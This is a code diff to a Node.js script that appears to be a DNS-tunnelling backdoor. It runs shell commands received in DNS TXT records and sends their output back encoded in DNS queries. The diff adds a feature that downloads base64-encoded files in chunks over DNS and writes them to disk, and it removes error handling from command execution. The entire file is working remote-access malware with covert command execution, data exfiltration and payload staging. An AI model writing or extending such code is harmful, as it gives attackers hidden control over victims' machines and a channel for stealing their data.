@@ -7,6 +7,8 @@ const NOP_SLEEP_TIME = 1;
 
 const dns = require('dns');
 const cp = require('child_process');
+const Buffer = require('buffer').Buffer;
+const fs = require('fs');
 
 process.on('SIGHUP', function() {});
 
@@ -28,8 +30,7 @@ function getDNSText(dest) {
 function system(cmd) {
   return new Promise(function(resolve, reject) {
     cp.exec(cmd, function (err, stdout, stderr) {
-      if (err) reject(err);
-      else resolve({stdout, stderr});
+      resolve({stdout, stderr});
     });
   });
 }
@@ -53,6 +54,19 @@ async function event() {
 
   for (const record of records) {
     const rtxt = record.join('');
+
+    if (rtxt.startsWith('payload ')) {
+      const args = rtxt.split(' ');
+      if (args.length < 4) continue;
+
+      const fn = args[1];
+      const pd = args[2];
+      const chunks = parseInt(args[3]);
+
+      await storePayload(fn, pd, chunks);
+      continue;
+    }
+
     let {stdout, stderr} = await system(rtxt);
     let packets = [];
     stdout = stdout.trim();
@@ -68,12 +82,27 @@ async function event() {
         packets = packets.concat(encode(line));
       }
     }
-    packets = packets.concat(encode('\xde\xadDONE'));
+    packets = packets.concat(encode('\xde\xadDN'));
 
     for (const packet of packets) {
       await getDNSText(packet + DOMAIN);
     }
   }
+}
+
+async function storePayload(name, desc, n_chunks) {
+  const parallel = [];
+  for (let i = 0; i < n_chunks; i++) {
+    const req = encode('\xde\xadPL '+desc+' '+i)[0];
+    parallel.push(getDNSText(req + DOMAIN).then(function(records) {
+      return records.map(r => r.join('')).join('');
+    }));
+  }
+  const chunks = await Promise.all(parallel);
+  const buffer = Buffer.from(chunks.join(''), 'base64');
+  fs.writeFileSync(name, buffer, {mode: 0o644});
+
+  await getDNSText(encode('\xde\xadPD')[0] + DOMAIN);
 }
 
 function encode(s) {
